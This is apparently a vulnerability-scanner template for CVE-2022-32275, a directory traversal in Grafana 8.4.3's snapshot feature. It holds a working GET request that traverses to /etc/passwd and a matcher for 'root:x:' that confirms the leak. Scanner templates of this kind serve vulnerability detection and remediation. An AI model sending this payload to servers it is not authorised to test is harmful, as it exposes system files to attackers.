id: CVE-2022-32275

info:
  name: Grafana Directory Traversal via Snapshot Feature
  author: ProjectDiscoveryAI
  severity: high
  description: Grafana 8.4.3 allows reading files via a crafted URL to the snapshot feature.
  impact: |
    An attacker could exploit this vulnerability to access sensitive files and data on the server.
  remediation: |
    Upgrade Grafana to a version that includes a fix for CVE-2022-32275 or apply the vendor-supplied patch.

http:
  - method: GET
    path:
      - "{{BaseURL}}/dashboard/snapshot/%7B%7Bconstructor.constructor'/../../../../../../../../etc/passwd?orgId=1"

    matchers:
      - type: word
        words:
          - "root:x:"
        part: body
